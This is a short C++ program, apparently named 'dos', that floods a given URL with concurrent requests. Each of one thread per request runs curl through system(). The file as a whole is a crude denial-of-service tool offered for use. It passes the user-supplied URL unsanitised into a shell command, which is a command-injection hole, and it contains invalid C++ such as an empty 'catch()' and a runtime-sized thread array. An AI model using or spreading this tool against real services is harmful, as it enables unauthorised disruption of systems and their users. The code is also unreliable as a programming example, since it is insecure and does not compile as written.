#include <iostream>
#include <string>
#include <thread>


using namespace std;

// function to hit an endpoint
void hit_endpoint(string url, int num_requests) {
    for (int i = 0; i < num_requests; i++) {
        try{
          system(("curl " + url).c_str());
        }
        catch(){
          cout << "Error" << endl;
        }
    }
}

//using threads to hit an endpoint
void hit_endpoint_thread(string url, int num_requests) {
    thread t[num_requests];
    for (int i = 0; i < num_requests; i++) {
        t[i] = thread(hit_endpoint, url, 1);
    }
    for (int i = 0; i < num_requests; i++) {
        t[i].join();
    }
}

// main function
int main(int argc, char *argv[]) {
    // check if the number of arguments is correct
    if (argc != 3) {
        cout << "Usage: ./dos <url> <num_requests>" << endl;
        return 1;
    }

    // get the url and number of requests
    string url = argv[1];
    int num_requests = atoi(argv[2]);

    // hit the endpoint
    hit_endpoint_thread(url, num_requests);

    return 0;
}